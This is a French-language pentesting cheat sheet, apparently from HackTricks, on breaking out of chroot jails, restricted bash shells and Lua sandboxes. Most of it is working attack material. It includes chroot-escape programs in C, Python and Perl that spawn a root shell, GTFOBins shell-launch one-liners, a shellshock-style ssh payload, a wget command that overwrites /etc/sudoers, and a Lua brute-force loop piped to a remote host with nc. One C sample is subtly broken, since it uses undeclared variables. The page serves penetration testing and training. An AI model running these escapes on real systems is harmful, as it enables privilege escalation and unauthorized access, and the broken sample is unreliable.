# Évasion des Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Recherchez sur** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si vous pouvez exécuter un binaire avec la propriété « Shell »**

## Évasions de Chroot

Depuis [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) : le mécanisme chroot **n'est pas conçu pour se défendre** contre une altération intentionnelle par des utilisateurs **privilégiés** (**root**). Sur la plupart des systèmes, les contextes chroot ne s'empilent pas correctement et les programmes chrootés **disposant de privilèges suffisants peuvent effectuer un second chroot pour s'en échapper**.\
Généralement, cela signifie que pour vous échapper, vous devez être root à l'intérieur du chroot.

> [!TIP]
> L'**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé pour exploiter les scénarios suivants et sortir d'un `chroot`.

### Root + CWD

> [!WARNING]
> Si vous êtes **root** à l'intérieur d'un chroot, vous **pouvez vous en échapper** en créant **un autre chroot**. Cela s'explique par le fait que 2 chroots ne peuvent pas coexister (sous Linux). Ainsi, si vous créez un dossier, puis **créez un nouveau chroot** dans ce nouveau dossier alors que **vous êtes à l'extérieur de celui-ci**, vous serez désormais **à l'extérieur du nouveau chroot** et vous vous trouverez donc dans le FS.
>
> Cela se produit parce que généralement, chroot NE déplace PAS votre répertoire de travail vers celui indiqué. Vous pouvez donc créer un chroot tout en restant à l'extérieur de celui-ci.

Généralement, vous ne trouverez pas le binaire `chroot` à l'intérieur d'un chroot jail, mais vous **pourriez compiler, téléverser et exécuter** un binaire :

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Cela ressemble au cas précédent, mais ici, l'**attaquant stocke un descripteur de fichier vers le répertoire courant**, puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et **s'échappe**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD peut être transmis via des Unix Domain Sockets, donc :
>
> - Créer un processus enfant (fork)
> - Créer un UDS afin que le parent et l'enfant puissent communiquer
> - Exécuter chroot dans le processus enfant, dans un dossier différent
> - Dans le processus parent, créer un FD vers un dossier situé en dehors du chroot du nouveau processus enfant
> - Transmettre ce FD au processus enfant à l'aide de l'UDS
> - Le processus enfant exécute chdir vers ce FD et, comme celui-ci se trouve en dehors de son chroot, il s'échappera de la jail

### Root + Mount

> [!WARNING]
>
> - Monter le périphérique root (/) dans un dossier à l'intérieur du chroot
> - Effectuer un chroot vers ce dossier
>
> Cela est possible sous Linux

### Root + /proc

> [!WARNING]
>
> - Monter procfs dans un dossier à l'intérieur du chroot (si ce n'est pas déjà fait)
> - Rechercher un pid ayant une entrée root/cwd différente, par exemple : /proc/1/root
> - Effectuer un chroot vers cette entrée

### Root(?) + Fork

> [!WARNING]
>
> - Créer un Fork (processus enfant), effectuer un chroot vers un autre dossier plus profond dans le FS et s'y déplacer avec CD
> - Depuis le processus parent, déplacer le dossier dans lequel se trouve le processus enfant vers un dossier situé avant le chroot des processus enfants
> - Ce processus enfant se retrouvera en dehors du chroot

### ptrace

> [!WARNING]
>
> - Autrefois, les utilisateurs pouvaient déboguer leurs propres processus depuis un processus leur appartenant... mais cela n'est plus possible par défaut
> - Quoi qu'il en soit, si cela est possible, vous pourriez utiliser ptrace sur un processus et y exécuter un shellcode ([voir cet exemple](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Obtenir des informations sur la jail :
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d’environnement PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utiliser vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers et visionneuses d'aide

De nombreux environnements restreints laissent encore des **pagers** ou des **visionneuses d'aide** disponibles. Il est généralement plus rapide de les détourner que d'essayer de reconstruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Si `git` est disponible, n’oubliez pas que sa sortie d’aide passe généralement par un pager :
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners courants de GTFOBins

Une fois que vous savez quels binaires sont accessibles, testez d’abord les lanceurs de shell évidents :
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Si vous pouvez uniquement **injecter des arguments** dans une commande autorisée (au lieu de l’exécuter librement), consultez également **GTFOArgs**.

### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable contenant _/bin/bash_.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash via SSH

Si vous vous connectez via ssh, vous pouvez souvent demander au serveur d'exécuter un **programme différent** au lieu du shell de connexion restreint :
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Si `ssh` fait partie des rares binaires autorisés localement, souvenez-vous qu’il peut également être détourné comme **GTFOBin** :
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Déclarer
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Vous pouvez par exemple écraser le fichier sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Certains environnements ne vous placent pas dans un `rbash` classique, mais dans des **wrappers** tels que `git-shell`, `rssh` ou `lshell` :

- `git-shell` accepte uniquement les commandes Git côté serveur ainsi que tout ce qui se trouve dans `~/git-shell-commands/`. Si ce répertoire existe, exécutez `help` pour énumérer les actions personnalisées autorisées. Si vous pouvez y **écrire**, tout exécutable déposé dans ce répertoire devient accessible.
- `rssh` / `lshell` autorisent généralement uniquement `scp`, `sftp`, `rsync` ou les opérations de type Git. Dans ces cas, concentrez-vous d'abord sur les **primitives d'écriture de fichiers** : téléversez `authorized_keys`, un fichier de démarrage du shell ou un script auxiliaire dans un emplacement accessible en écriture, puis reconnectez-vous avec `ssh -t ...`.
- Si le wrapper ne fait que filtrer la ligne de commande, énumérez les binaires accessibles, puis utilisez **GTFOBins / GTFOArgs**.

### Autres tricks

Vérifiez également :

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**La page suivante pourrait également être intéressante :**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Vous trouverez des tricks concernant l'évasion des python jails sur la page suivante :


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Sur cette page, vous trouverez les fonctions globales auxquelles vous avez accès dans Lua : [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval avec exécution de commandes :**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Quelques astuces pour **appeler des fonctions d’une bibliothèque sans utiliser de points** :
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Énumérer les fonctions d’une bibliothèque :
```bash
for k,v in pairs(string) do print(k,v) end
```
Notez qu'à chaque fois que vous exécutez le one-liner précédent dans un **environnement Lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par brute force en chargeant différents environnements Lua et en appelant la première fonction de la bibliothèque :
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un lua shell interactif** : Si vous êtes dans un lua shell limité, vous pouvez obtenir un nouveau lua shell (et, espérons-le, illimité) en appelant :
```bash
debug.debug()
```
## Références

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositives : [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
